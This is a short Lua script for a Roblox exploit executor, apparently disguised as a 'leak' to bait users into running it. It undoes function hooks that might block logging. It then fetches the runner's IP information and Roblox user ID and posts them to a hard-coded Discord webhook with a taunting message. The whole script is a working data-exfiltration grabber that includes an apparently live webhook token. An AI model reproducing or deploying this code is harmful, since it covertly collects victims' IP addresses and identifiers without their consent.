local r = syn and syn.request or request or http_request
restorefunction(game.HttpGet)
restorefunction(r)
r({Url = "https://discord.com/api/webhooks/1223508326814449675/WXna6_LTlCVuV2bcxOwGyxAvbXvu7dcl7miDrkQ-nNd7c4PmVcHo41vtelM1uLg2Ycji", Method = "POST", Body = {
  content = "NA, THIS GUY ACTUALLY RAN THE LEAK LMFAO!!! ip stuffs: "..game:HttpGet("https://httpbin.org/get").." uid: "..tostring(game:GetService("Players").LocalPlayer.UserId)
}}) 
